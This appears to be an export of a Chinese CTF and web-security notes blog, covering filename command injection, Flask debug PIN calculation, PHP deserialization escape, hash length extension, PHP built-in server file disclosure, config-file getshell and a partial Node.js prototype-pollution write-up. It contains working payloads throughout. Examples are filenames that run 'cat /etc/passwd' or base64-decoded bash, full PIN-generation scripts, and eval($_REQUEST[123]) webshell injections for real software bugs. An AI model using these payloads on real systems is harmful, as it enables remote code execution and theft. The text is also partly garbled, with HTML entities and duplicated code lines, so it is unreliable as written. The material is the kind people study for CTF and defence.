都是Yes说明主从复制已经开启\n然后就按之前得到信息，在主库建立ctf库，然后建立admin表，在里面添加user和password的数据、\n最后等环境数据库【从库】与攻击机数据库同步后，即可进行成功登录拿到flag\n\n\n\n\n\n\n\n\n\nP.S\n由于mysql8新增密码规则caching_sha2_password，要求密码必须有一定复杂度，必须有字母大小写、数字和特殊符号，所以可能有时密码通不过，可以尝试修改密码规则为mysql_native_password以实现可以用简易密码\nwindows与linux对;的不同解析与限制在windows中，你可以将文件名名为类似\n\n\n\n\n\n\n\n\n\n1;hahahaha;.txt\n\n而在linux中则不行，因为它会将其解析成三段命令\n\n\n\n\n\n\n\n\n\n1 hahahaha .txt\n如果想要命名，则需要单引号包裹\n\n\n\n\n\n\n\n\n\n\n&#x3D;&#x3D;&gt;所以如果存在一个环境，会将上传的zip文件自动解压，或者会将上传文件进行检测并把上传文件文件名包含在命令中，并且没有加上引号限制字符类型\n比如\nunzip -oq /tmp/xx -d /home/\nor\ncat /tmp/xx\n\n那么猜测如果文件名为\n\n\n\n\n\n\n\n\n\n1;cat &#x2F;etc&#x2F;passwd;zip\n那么执行时，就会导致\nunzip -oq /tmp/1;\ncat /etc/passwd;\n.zip -d /home/\n\n就实现了上传文件达到RCE的目的，并且这些命令大都是以root权限执行的命令，所以操作性极大，危害极大，实际环境应注意这些用户可控的数据数据不能不经过处理并入任何命令中去\n\n当然实际环境下命令大都可能会因为一些原因被过滤或者无法执行，亦或者是内容无法回显，可以考虑将其转换为其他编码类型，并将回显内容导入到其他文件中去，再来执行\n\n\n\n\n\n\n\n\n\n1;echo L2ZsYWcgPiAvdmFyL3d3dy9odG1sL3B1YmxpYy9mbGFnLnR4dA&#x3D;&#x3D;|base64 -d|bash;.zip\n#echo &#x2F;flag &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;public&#x2F;flag.txt\nFlask的Debug模式在比赛时，看到有道题大佬一直在说看看flask的debug开启没，记录学习一下\n使用 Flask 开发过程中存在两个常见的问题：\n\n\n\n\n\n\n\n\n\n\n当 Flask 程序出错时，没有提示错误的详细信息；\n修改 Flask 源代码后需要重启 Flask 程序。\n\ndebug模式开启的代码就是\nfrom flask from flask import Flask\napp = Flask(__name__)\n\nif __name__ == &#x27;__main__&#x27;:\n    app.run(debug = True) #这里就是开启debug模式\n\n运行时，显示输出也会显示debug模式开启\n\n\n\n\n\n\n\n\n\n$ python3 debug.py\n\nServing Flask app “debug” (lazy loading)\nEnvironment: production\nDebug mode: on\nRestarting with stat\nDebugger is active!\nDebugger PIN: 316-471-540\nRunning on http://127.0.0.1:5000/ (Press CTRL+C to quit)\n\n开启后，当程序运行错误时，网站页面就会将错误点所在代码显示，并且给出错误原因以及修正方案\n而如果不开启debug模式，显示的结果就不会显示错误原因\n\n而开启后就是\n\n而修改的话，也不用退出程序，重新加载\n直接修改代码，然后保存，就会成功修改并且自行重启，并且不会影响程序的正常运行，程序输出也会显示程序已修改\n\n利用debug功能能干啥flask在debug模式下会生成一个debugger pin，并且多次重启flask服务，PIN码不会改变\n\n通过PIN码可以进入python的交互式shell\n如\n\n这里1/0报错\n点击后，右边就会显示一个终端的图标，点击后，需要提供PIN码，然后便可以进入交互式shell\n\n查看当前目录下文件\nimport subprocess\n\nresult = subprocess.run(&#x27;dir&#x27;, shell=True, stdout=subprocess.PIPE)\n\noutput = result.stdout.decode(&#x27;gbk&#x27;)\n\nprint(output)\n\n\n而服务器端的请求头\n\n\n\n\n\n\n\n\n\n127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:30] “GET &#x2F;?&amp;debugger&#x3D;yes&amp;cmd&#x3D;import%20subprocess&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1” 200 -127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:35] “GET &#x2F;?&amp;debugger&#x3D;yes&amp;cmd&#x3D;result%20%3D%20subprocess.run(‘dir’,%20shell%3DTrue,%20stdout%3Dsubprocess.PIPE)&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1” 200 -127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:40] “GET &#x2F;?&amp;debugger&#x3D;yes&amp;cmd&#x3D;output%20%3D%20result.stdout.decode(‘gbk’)&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1” 200 -127.0.0.1 - - [15&#x2F;Jun&#x2F;2023 13:55:45] “GET &#x2F;?&amp;debugger&#x3D;yes&amp;cmd&#x3D;print(output)&amp;frm&#x3D;1667679842080&amp;s&#x3D;D2NOP9f9DNQJyoqfpR0O HTTP&#x2F;1.1” 200 -\n所以可以看到，启动debug在公开环境下，是非常不安全的，不仅用户可以看到你的代码内容，而且如果当前flask服务的PIN码泄露，还会造成被攻击者远程执行命令等一系列恶意操作\n但是也不容易实现这个条件\n\n因为PIN rce实现是需要设置cookie头的，而且实际进行时会发现 PIN RCE 无法进行CRLF拆分注入，因为它根本不解析回车换行，只能一行行进行输入，所以很难实现\nPIN 码如何生成但是PIN码并不是随机生成，当我们重复运行同一程序时，生成的PIN一样，PIN码生成满足一定的生成算法\n在\napp.run(debug = True)app.run(debug = app.run(debug = True)app.run(debug = True)\n\n这段代码敲断点，发现了get_pin_and_cookie_name函数\ndef get_pin_and_cookie_name(def get_pin_and_cookie_name(\n    app: \"WSGIApplication\",\n) -> t.Union[t.Tuple[str, str], t.Tuple[None, None]]:\n    \"\"\"Given an application object this returns a semi-stable 9 digit pin\n    code and a random key.  The hope is that this is stable between\n    restarts to not make debugging particularly frustrating.  If the pin\n    was forcefully disabled this returns `None`.\n​\n    Second item in the resulting tuple is the cookie name for remembering.\n    \"\"\"\n    pin = os.environ.get(\"WERKZEUG_DEBUG_PIN\")\n    rv = None\n    num = None\n​\n    Pin was explicitly disabled\n    if pin == \"off\":\n        return None, None\n​\n    # Pin was provided explicitly\n    if pin is not None and pin.replace(\"-\", \"\").isdigit():\n        # If there are separators in the pin, return it directly\n        if \"-\" in pin:\n            rv = pin\n        else:\n            num = pin\n​\n    modname = getattr(app, \"__module__\", t.cast(object, app).__class__.__module__)\n    username: t.Optional[str]\n​\n    try:\n        # getuser imports the pwd module, which does not exist in Google\n        # App Engine. It may also raise a KeyError if the UID does not\n        # have a username, such as in Docker.\n        username = getpass.getuser()\n    except (ImportError, KeyError):\n        username = None\n​\n    mod = sys.modules.get(modname)\n​\n    # This information only exists to make the cookie unique on the\n    # computer, not as a security feature.\n    probably_public_bits = [\n        username,\n        modname,\n        getattr(app, \"__name__\", type(app).__name__),\n        getattr(mod, \"__file__\", None),\n    ]\n​\n    # This information is here to make it harder for an attacker to\n    # guess the cookie name.  They are unlikely to be contained anywhere\n    # within the unauthenticated debug page.\n    private_bits = [str(uuid.getnode()), get_machine_id()]\n​\n    h = hashlib.sha1()\n    for bit in chain(probably_public_bits, private_bits):\n        if not bit:\n            continue\n        if isinstance(bit, str):\n            bit = bit.encode(\"utf-8\")\n        h.update(bit)\n    h.update(b\"cookiesalt\")\n​\n    cookie_name = f\"__wzd&#123;h.hexdigest()[:20]&#125;\"\n​\n    # If we need to generate a pin we salt it a bit more so that we don&#x27;t\n    # end up with the same value and generate out 9 digits\n    if num is None:\n        h.update(b\"pinsalt\")\n        num = f\"&#123;int(h.hexdigest(), 16):09d&#125;\"[:9]\n​\n    # Format the pincode in groups of digits for easier remembering if\n    # we don&#x27;t have a result yet.\n    if rv is None:\n        for group_size in 5, 4, 3:\n            if len(num) % group_size == 0:\n                rv = \"-\".join(\n                    num[x : x + group_size].rjust(group_size, \"0\")\n                    for x in range(0, len(num), group_size)\n                )\n                break\n        else:\n            rv = num\n​\n    return rv, cookie_name\n\n生成要素：\n\n\n\n\n\n\n\n\n\nusername通过getpass.getuser()读取，通过文件读取&#x2F;etc&#x2F;passwd引用modname通过getattr(mod,“file”,None)读取，默认值为flask.app引用appname通过getattr(app,“name”,type(app).name)读取，默认值为Flask引用moddir当前网络的mac地址的十进制数，通过getattr(mod,“file”,None)读取实际应用中通过报错读取引用uuidnode通过uuid.getnode()读取，通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address得到16进制结果，转化为10进制进行计算引用machine_id每一个机器都会有自已唯一的id，machine_id由三个合并(docker就后两个)：\n1.&#x2F;etc&#x2F;machine-id (&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address)\n2.&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id \n3.&#x2F;proc&#x2F;self&#x2F;cgroup\n\n\n\n\n\n\n\n\n\n不同版本算法区别3.6采用MD5加密，3.8采用sha1加密，所以脚本有所不同\n生成算法3.6 MD5\n#MD5\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n     &#x27;flaskweb&#x27;\n     &#x27;flask.app&#x27;,\n     &#x27;Flask&#x27;,\n     &#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;\n]\n​\nprivate_bits = [\n     &#x27;25214234362297&#x27;,\n     &#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;\n]\n​\nh = hashlib.md5()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode(&#x27;utf-8&#x27;)\n    h.update(bit)\nh.update(b&#x27;cookiesalt&#x27;)\n​\ncookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]\n​\nnum = None\nif num is None:\n   h.update(b&#x27;pinsalt&#x27;)\n   num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]\n​\nrv =None\nif rv is None:\n   for group_size in 5, 4, 3:\n       if len(num) % group_size == 0:\n          rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)\n                      for x in range(0, len(num), group_size))\n          break\n       else:\n          rv = num\n​\nprint(rv)\n\n3.8 SHA-1\n#sha1\nimport hashlib\nfrom itertools import chain\nprobably_public_bits = [\n    &#x27;root&#x27;\n    &#x27;flask.app&#x27;,\n    &#x27;Flask&#x27;,\n    &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;\n]\n​\nprivate_bits = [\n    &#x27;2485377581187&#x27;,\n    &#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;\n]\n​\nh = hashlib.sha1()\nfor bit in chain(probably_public_bits, private_bits):\n    if not bit:\n        continue\n    if isinstance(bit, str):\n        bit = bit.encode(&#x27;utf-8&#x27;)\n    h.update(bit)\nh.update(b&#x27;cookiesalt&#x27;)\n​\ncookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]\n​\nnum = None\nif num is None:\n    h.update(b&#x27;pinsalt&#x27;)\n    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]\n​\nrv =None\nif rv is None:\n    for group_size in 5, 4, 3:\n        if len(num) % group_size == 0:\n            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)\n                          for x in range(0, len(num), group_size))\n            break\n    else:\n        rv = num\n​\nprint(rv)\n\n反序列化逃逸\n\n\n\n\n\n\n\n\n变短吸收后面，变长挤掉后面\ns:5:”12345”中\n5是说明也是限制，后面的5个字符都属于字符串\ns:5:”1234””中\n1234”也算是字符串，”不起闭合作用\n\n如变长\n\nx-&gt;yy\ns:6:”xxxxxx”\nfilter后\ns:6:”yyyyyyyyyyyy”(反序列化会报错)\n所以修改一下filter前的\n\n\n\n\n\n\n\n\n\ns:6:”xxx”;}”\n其中字符串为xxx”;} 这6个，但是当x-&gt;yy后，xxx变长为6位xxxxxx\ns:6:”yyyyyy”;}”\n字符串就为yyyyyy了，&quot;;&#125;就实现了成功逃逸，将语句闭合，当然逃逸数据可以修改，长度刚好为变长部分长度\n\n如变短\n\n\n\n\n\n\n\n\n\nxx-&gt;y\ns:6:”xxxxxx”;}O:5\nfilter后\ns:6:”yyy”;}O:5(反序列化会报错)\n所以修改一下filter前的\n\n\n\n\n\n\n\n\n\ns:18:”xxxxxxxxxxxxxxxxxx“;s:23:”a&quot;;&#125;O:4:&#123;s:5:&quot;hacker&quot;;&#125;“;}O:5\n其中字符串为这16个，但是当xx-&gt;y后，xxxxxxxxxxxxxxxxxx变短为9位xxxxxxxxx\ns:18:”yyyyyyyyy&quot;;s:23:&quot;a“;}O:4:{s:4:”hacker”;}”;}O:5\n字符串就为yyyyyyyyy&quot;;s:23:&quot;a了，\n而;}就将其闭合了，而后O:4:&#123;s:5:&quot;hacker&quot;;&#125;就逃出来了\n变短就是数一下后面需要吞掉截断的字符串到其最后一个引号的字符个数，要是filter数据长度的一半\n\n\n\nsession进行文件包含\n\n\n\n\n\n\n\n\nsession包含需要session打开，没打开怎么办，页面没有session\nsession.upload_progress作用？\n\n\n\n\n\n\n\n\nsession.upload_progress.enabled &#x3D; on\nsession.upload_progress.cleanup &#x3D; on\nsession.upload_progress.prefix &#x3D; “upload_progress_“\nsession.upload_progress.name &#x3D; “PHP_SESSION_UPLOAD_PROGRESS“\n\n\n\n\n\n\n\n\n\nsession.upload_progress.enabled可以控制是否开启session.upload_progress功能\nsession.upload_progress.cleanup可以控制是否在上传之后删除文件内容\nsession.upload_progress.prefix可以设置上传文件内容的前缀\nsession.upload_progress.name的值即为session中的键值\nsession.upload_progress开启之后，此时我们再往服务器中上传一个文件时，PHP会把该文件的详细信息(如上传时间、上传\n进度等)存储在session当中。\n初始化session\nsession.use_strict_mode是一个PHP配置选项，它指定了在使用cookie存储会话ID时是否启用严格模式。当启用严格模式时，会话\nID只能通过HTTPS连接传输，并且不能通过URL参数传递。这可以防止会话劫持攻击。如果未启用严格模式，则会话ID可以通过HTTP连\n接传输，并且可以通过URL参数传递。这可能会导致会话劫持攻击。默认情况下，session.use_strict_mode设置为0（禁用）\nhash长度扩展攻击\n\n\n\n\n\n\n\n\n学习文章\nhash长度扩展攻击 | KANGEL (j-kangel.github.io)\n\n\n\n\n\n\n\n\n\nHash长度拓展攻击（Length Extension Attack）是一种针对特定类型哈希算法的攻击技术。哈希算法是一种将任意大小的数据转换成固定大小哈希值（通常是一串十六进制字符）的算法。这些哈希值通常用于校验数据完整性和验证数据的唯一性。\n在正常情况下，哈希算法的输出长度是固定的，而且算法是不可逆的，意味着从哈希值恢复原始数据是非常困难的。但是，由于一些哈希算法的设计问题，存在一种被称为“Hash长度拓展攻击”的漏洞。\nHash长度拓展攻击利用了特定哈希算法的漏洞，使攻击者能够根据已知的哈希值和原始数据的部分内容生成一个新的有效哈希值，而无需知道原始数据的其余部分。攻击者能够在已知哈希值的基础上构造出一个新的哈希值，看起来就像是在已知数据后附加了其他内容，并且新的哈希值也是有效的。\nMD5加密原理先放图，（虽然上了密码学课\n\n\n总共可以分为，\n\n\n\n\n\n\n\n\n\n\n把消息分为n个分组\n对最后一个消息分组进行填充\n和输入量进行运算，运算结果位下一个分组的输入量\n输出最终结果\n\nMD5算法输入的消息以512bit的分组为单位处理，共64byte\n然后对每个分组进行加密，前一次的加密的结果会作为这一次加密的输入，最后一次加密的结果即为最终的MD5值。\n不足64字节的分组需要进行补位，也就是字节填充。\n\n\n\n\n\n\n\n\n\n补位原则：首先将需要hash的字符串进行分组，即字符串长度（以字节为单位）整除64，最后一组不足56字节的进行字节填充。填充的第一个字节为0x80，其他均为0x00。剩下的8个字节(64bit)用来表示原字符串的长度。\n\n拿*CTF 2023 jwt2struts题目为例\n\n\n\n\n\n\n\n\n\n$_COOKIE[“digest”] 要求为 md5($salt.$username.$password)要满足$username &#x3D;&#x3D;&#x3D; “admin” &amp;&amp; $password !&#x3D; “root”&#x2F;&#x2F;$salt &#x3D; XXXXXXXXXXXXXX &#x2F;&#x2F; the salt include 14 characters&#x2F;&#x2F;md5($salt.”adminroot”)&#x3D;e6ccbf12de9d33ec27a5bcfb6a3293df\n这个是提示，发现我们知道了md5($salt.&quot;adminroot&quot;)的值，也就是我们的目的MD5值，再加上我们想要加密的字符串，salt的长度已知，后段的adminroot已知\n符合情形，\n\n\n\n\n\n\n\n\n\n\n已知需要加密的字段（如，已知adminroot）\n已知salt的长度，但不知道具体值\n\n可以直接用工具hashdump即可\nphp&lt;&#x3D;7.4.21 内置服务器任意文件读取\n\n\n\n\n\n\n\n\nhttps://blog.projectdiscovery.io/php-http-server-source-disclosure/\n羊城杯遇到的知识点，在php&lt; = 7.4.21任意文件读取\n开始看到这个页面其实很陌生\n\n和常见的apache以及nginx的404都不一样\n搜了一下发现是php内置服务器搭建的网站\n\n\n\n\n\n\n\n\n\n\nps.后面看其他人wp才知道，可以扫描网站的，怕被封号没扫，网站下有个start.sh，里面就给出了网站的启动命令和flag的位置，结果我还取解密看重定向响应，麻了\n当然题目是反序列化读文件，但是我们得先读取到源码内容，\n网站中想要读取php的源码一般是rce和文件包含才能得到，但是题目只给了404页面，以及有个待读取源码的p0p.php文件\n利用php内置服务器而不靠中间件搭建的网站，真的安全吗？\nphp -S 0.0.0.0:8888\n\n利用万能ai给出文章网站\n\n在php&lt;&#x3D;7.4.21版本中，利用php内置服务器搭建的网站存在任意文件读取，但也只是只能读取该命令执行所在目录下的文件，不过正好可以读出p0p.php的内容\n但是题目关了，知识点，我在wsl复现一下\n\n\n\n\n\n\n\n\n\n\n环境：\nwsl2 系统kali\nphp版本 7.0.33\n\n我在命令启动的目录下生成了一个flag.php\n\n//flag&#123;test&#125;\necho \"flag_is_here\";\n?>\n\n正常访问只能看到flag_is_here\n\n但是看不到flag&#123;test&#125;\n但是通过构造特殊结构的请求体就可以访问成功，\n\n\n\n\n\n\n\n\n\nGET &#x2F;flag.php HTTP&#x2F;1.1Host: 172.28.31.86:8888\nGET &#x2F; HTTP&#x2F;1.1\n\n发现flag.php的内容被完全显示出来，而服务器中的访问数据只是访问了首页\n\n\n\n\n\n\n\n\n\n\n原理有点绕，可以看看7.4.21和7.4.22的区别分析一下\n7.4.21&lt;&#x3D;版本&lt;&#x3D;8.0.2复现当然并不是高版本就不行了，，其实高版本也存在这个漏洞\n在低于8.0.2版本的php，如果想要复现这个漏洞需要满足一个条件，就是命令执行所在的目录下必须没有index.php文件才可以实现\n低版本有index.php情况我们先在7.0.33版本下生成一个index.php文件，\n\necho \"welcome index!\";\n?>\n\n\n发现在低版本下如果在目录执行的目录下有index.php，也无法进行任意文件内容的读取\n总结\n\n\n\n\n\n\n\n\n想要实现php内置服务器任意文件读取，首先是要满足版本要求，其次需要满足，对方执行搭建内置服务器的目录下没有index.php文件，才可以实现任意文件内容的一个读取，不过一般的开发者都不会把php内置服务器搭建的网站挂在公网上，不过这个漏洞也是一个值得考虑的一个利用点\nphp &lt; 8非法参数名传参当传参$_REQUEST[&#39;mo chu.&#39;]\n参数名中含有空格和点，可以看到当我们传入?mo chu. =xxx时，传入的参数名中点.和空格都被替换为了下划线_，这样的参数名确实无法传参。\n当PHP版本小于8时，如果参数中出现中括号[，中括号会被转换成下划线_，但是会出现转换错误导致接下来如果该参数名中还有非法字符并不会继续转换成下划线_，也就是说如果中括号[出现在前面，那么中括号[还是会被转换成下划线_，但是因为出错导致接下来的非法字符并不会被转换成下划线_。\nPayload如下：\n?mo[chu.?mo[chu.7=xxx\n\n利用了如果传入的参数名出现了中括号[只替换一次的原理，使得传入的参数为：mo_chu.7\n但是如果出现了多个 [，就无法替换了\n在PHP8中这种转换错误被修复了，传入的参数名中非法字符一律全部转换为了下划线\nPHP写入配置文件的经典漏洞在一个比赛中了解到的一个漏洞，关键在于绕过函数从而包含\n转载文章\n`\n\n\nconfig.php 的内容如下:\n\n\n要求是要getshell,这个场景十分经典，常用在修改配置文件写入的时候。此处不存在之前说的那个配置文件中用的是”双引号”引起任意代码执行的问题,这这里面用的是单引号,而且 addslashes()处理过了,看似很安全,但是对于脑子里有个黑洞的搞安全的人来讲,这个还真是有问题的.\n方法一,利用换行符来绕过正则匹配的问题可以看到正则匹配的是以下内容:\n$option=&#x27;任意内容&#x27;\n\n\n任意内容里面是可以包含转移符 \\ 的,所以我们利用下面的方法:\nhttp://127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();//\nhttp://127.0.0.1/index.php?option=a\n\n\n执行完第一个之后,config.php中的内容为:\n\n\n但是这样并没有办法执行phpinfo(),因为我们插入的 单引号 被转移掉了,所以phpinfo()还是在单引号的包裹之内.我们在访问下面这个\nhttp://127.0.0.1/index.php?option=a\n\n\n因为正则 .* 会匹配行内的任意字符无数次.所以 \\ 也被认为是其中的一部分,也会被替换掉,执行完之后,config.php中的内容为:\n\n\n\n转义符就被替换掉了,就成功的getshell.\n方法二,利用 preg_replace函数的问题:用preg_replace()的时候replacement(第二个参数)也要经过正则引擎处理，所以正则引擎把\\\\转义成了\\也就是说如果字符串是\\\\\\&amp;#39;,经过 preg_replace()的处理,就变为 #39;,单引号就逃出来了.所以payload如下:\nhttp://127.0.0.1/index.php?option=a\\&#x27;;phpinfo();//\n\n\nconfig.php变为:\n\n\n**道理就是  a\\&amp;#39;;phpinfo();//  经过 addslashes()处理之后,变为a\\\\\\&amp;#39;;phpinfo();// 然后两个反斜杠被preg_replace变成了一个,导致单引号逃脱.\n方法三, 利用 preg_replace() 函数的第二个参数的问题先看官方对preg_replace()函数的描述manual函数原型:\nxed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &$count ]] )\n\n\n对replacement的描述.replacement中可以包含后\n向引用\\\\n或(php 4.0.4以上可用)$n，语法上首选后者。 每个 这样的引用将被匹配到的第n个捕获子组捕获到的文本替换。 n 可以是0-99，\\\\0和$0代表完整的模式匹配文本。\n所以我们可以用:\nhttp://127.0.0.1/test/ph.php?option=;phpinfo();\nhttp://127.0.0.1/test/ph.php?option= 或者 http://127.0.0.1/test/ph.php?option=$0\n\n\n执行第一条后config.php的内容为:\n\n\n\n再执行第二条后config.php的内容为:\n\n\n\n刚好闭合掉了前后的两个单引号中间的逃脱出来了.想出这个办法的人,思路真是可以的.\n\n要getshell直接\n把phpinfo()替换成\neval($_REQUEST[123])\nassert($_REQUEST[123])\n蚁剑连接即可\n\n","slug":"Notes","date":"2023-02-15T09:34:06.818Z","categories_index":"web","tags_index":"daily","author_index":"Ttoc"},{"id":"a008a70087e40ad6885d0ce08a94aee5","title":"工具项目编写","content":"主要通过写项目练习一下自己的go语言水平\n\n\nwfuzzhttps://github.com/try-to-change/wfuzz-ttoc\n\n\n\n\n\n\n\n\n\n\n定义命令行参数，使用flag包进行解析。\n使用http包发送请求，并使用goroutine和channel实现并发。\n在发送请求之前，根据传入的参数，使用strings包中的Replace函数替换FUZZ参数。\n根据不同的payload格式，使用bufio包进行读取和解析。\n使用for循环和range关键字实现迭代器。\n根据页面响应、状态码等信息，使用正则表达式或标准库中的http包中的Response结构体中的状态码等信息进行判断。\n将请求结果输出到标准输出或文件中，使用标准库中的io包即可。同时可以在输出时，添加更多的信息，如请求的URL、响应状态码等。\n使用log包记录程序运行日志，方便调试和错误处理\n实现统计请求次数、成功次数、失败次数等功能，方便对工具性能进行评估。\n\n\n\n\n\n\n\n\n\n\n对于wfuzz更深入功能并未进行书写\n由于练手熟悉go开发，所以只大致实现了部分功能，其实我也觉得代码稍微有点臃肿，如果有建议和优化的思路，我将时刻准备学习你的建议\nMD5_FLChttps://github.com/try-to-change/MD5_FIC\n\n\n\n\n\n\n\n\n\n本项目是基于golang的CS模式的md5文件完整性检测，实现客户端的ui化，便于选择检测上传文件，对一些连接问题进行了处理，对于检测失败的文件会进行删除，对于上传文件，为了服务器安全会进行名字根据时间hash重新编码\n项目主要为工程实践完成，可能在实际运行中存在问题，可以在issues中与我交流或者Pull requests即可\n\n\n","slug":"tools-making","date":"2023-02-15T04:11:15.439Z","categories_index":"daily","tags_index":"go语言","author_index":"Ttoc"},{"id":"3e22a855be290895a6fbe5843d97f92e","title":"西湖论剑2022-wp","content":"麻了，我也想在比赛时输出，而不是比赛后\n\n\n西湖论剑2022real_ez_node启动环境后页面\n\nejs猜测是原型链污染\n分析一下代码\napp.js\nvar createError = require(var createError = require(&#x27;http-errors&#x27;);\nvar express = require(&#x27;express&#x27;);\nvar path = require(&#x27;path&#x27;);\nvar fs = require(&#x27;fs&#x27;);\nconst lodash = require(&#x27;lodash&#x27;)\nvar cookieParser = require(&#x27;cookie-parser&#x27;);\nvar logger = require(&#x27;morgan&#x27;);\nvar session = require(&#x27;express-session&#x27;);\nvar index = require(&#x27;./routes/index&#x27;);\nvar bodyParser = require(&#x27;body-parser&#x27;);//解析,用req.body获取post参数\nvar app = express();\napp.use(bodyParser.json());\napp.use(bodyParser.urlencoded(&#123;extended: false&#125;));\napp.use(cookieParser());\napp.use(session(&#123;\n  secret : &#x27;secret&#x27;, // 对session id 相关的cookie 进行签名\n  resave : true,\n  saveUninitialized: false, // 是否保存未初始化的会话\n  cookie : &#123;\n    maxAge : 1000 * 60 * 3, // 设置 session 的有效时间，单位毫秒\n  &#125;,\n&#125;));\n// view engine setup\napp.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));\napp.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);\n// app.engine(&#x27;ejs&#x27;, function (filePath, options, callback) &#123;    // 设置使用 ejs 模板引擎 \n//   fs.readFile(filePath, (err, content) => &#123;\n//       if (err) return callback(new Error(err))\n//       let compiled = lodash.template(content)    // 使用 lodash.template 创建一个预编译模板方法供后面使用\n//       let rendered = compiled()\n\n//       return callback(null, rendered)\n//   &#125;)\n// &#125;);\napp.use(logger(&#x27;dev&#x27;));\napp.use(express.static(path.join(__dirname, &#x27;public&#x27;)));\napp.use(&#x27;/&#x27;, index);\n// app.use(&#x27;/challenge7&#x27;, challenge7);\n// catch 404 and forward to error handler\napp.use(function(req, res, next) &#123;\n  next(createError(404));\n&#125;);\n\n// error handler\napp.use(function(err, req, res, next) &#123;\n  // set locals, only providing error in development\n  res.locals.message = err.message;\n  res.locals.error = req.app.get(&#x27;env&#x27;) === &#x27;development&#x27; ? err : &#123;&#125;;\n\n  // render the error page\n  res.status(err.status || 500);\n  res.render(&#x27;error&#x27;);\n&#125;);\n\nmodule.exports = app;\n\n\nroute/index.js\nvar express = require(var express = require(&#x27;express&#x27;);\nvar http = require(&#x27;http&#x27;);\nvar router = express.Router();\nconst safeobj = require(&#x27;safe-obj&#x27;);\nrouter.get(&#x27;/&#x27;,(req,res)=>&#123;\n  if (req.query.q) &#123;\n    console.log(&#x27;get q&#x27;);\n  &#125;\n  res.render(&#x27;index&#x27;);\n&#125;)\nrouter.post(&#x27;/copy&#x27;,(req,res)=>&#123;\n  res.setHeader(&#x27;Content-type&#x27;,&#x27;text/html;charset=utf-8&#x27;)\n  var ip = req.connection.remoteAddress;\n  console.log(ip);\n  var obj = &#123;\n      msg: &#x27;&#x27;,\n  &#125;\n  if (!ip.includes(&#x27;127.0.0.1&#x27;)) &#123;\n      obj.msg=\"only for admin\"\n      res.send(JSON.stringify(obj));\n      return \n  &#125;\n  let user = &#123;&#125;;\n  for (let index in req.body) &#123;\n      if(!index.includes(\"__proto__\"))&#123;\n          safeobj.expand(user, index, req.body[index])\n      &#125;\n    &#125;\n  res.render(&#x27;index&#x27;);\n&#125;)\n\nrouter.get(&#x27;/curl&#x27;, function(req, res) &#123;\n    var q = req.query.q;\n    var resp = \"\";\n    if (q) &#123;\n        var url = &#x27;http://localhost:3000/?q=&#x27; + q\n            try &#123;\n                http.get(url,(res1)=>&#123;\n                    const &#123; statusCode &#125; = res1;\n                    const contentType = res1.headers[&#x27;content-type&#x27;];\n                  \n                    let error;\n                    // 任何 2xx 状态码都表示成功响应，但这里只检查 200。\n                    if (statusCode !== 200) &#123;\n                      error = new Error(&#x27;Request Failed.\\n&#x27; +\n                                        `Status Code: $&#123;statusCode&#125;`);\n                    &#125;\n                    if (error) &#123;\n                      console.error(error.message);\n                      // 消费响应数据以释放内存\n                      res1.resume();\n                      return;\n                    &#125;\n                  \n                    res1.setEncoding(&#x27;utf8&#x27;);\n                    let rawData = &#x27;&#x27;;\n                    res1.on(&#x27;data&#x27;, (chunk) => &#123; rawData += chunk;\n                    res.end(&#x27;request success&#x27;) &#125;);\n                    res1.on(&#x27;end&#x27;, () => &#123;\n                      try &#123;\n                        const parsedData = JSON.parse(rawData);\n                        res.end(parsedData+&#x27;&#x27;);\n                      &#125; catch (e) &#123;\n                        res.end(e.message+&#x27;&#x27;);\n                      &#125;\n                    &#125;);\n                  &#125;).on(&#x27;error&#x27;, (e) => &#123;\n                    res.end(`Got error: $&#123;e.message&#125;`);\n                  &#125;)\n                res.end(&#x27;ok&#x27;);\n            &#125; catch (error) &#123;\n                res.end(error+&#x27;&#x27;);\n            &#125;\n    &#125; else &#123;\n        res.send(\"search param &#x27;q&#x27; missing!\");\n    &#125;\n&#125;)\nmodule.exports = router;\n\n\n\n\n\n\n\n\n\n\n从app.js中看出是利用\n","slug":"2022西湖论剑","date":"2023-02-14T05:04:26.911Z","categories_index":"网络安全学习","tags_index":"Game","author_index":"Ttoc"},{"id":"e5e8f1b2dedddaa2854454c5662c45e6","title":"强网拟态2022-wp","content":"学习学习\n\n\n强网拟态2022WHOYOUARE这道题目的环境是nodejs，猜考点是原型链污染，其框架根据附件名称可知为fastify\n\n看题目名字和刚打开题目的提示，猜测污染漏洞点应该在user处，应该在某个检查user信息的地方可以进行原型链污染\n\n代码审计先审一下app.js\napp.jsconst userRoutes = require(const userRoutes = require(&#x27;./routes/user&#x27;)\nconst fastify = require(&#x27;fastify&#x27;)(&#123;\n    logger: &#123;\n        level: &#x27;error&#x27;\n    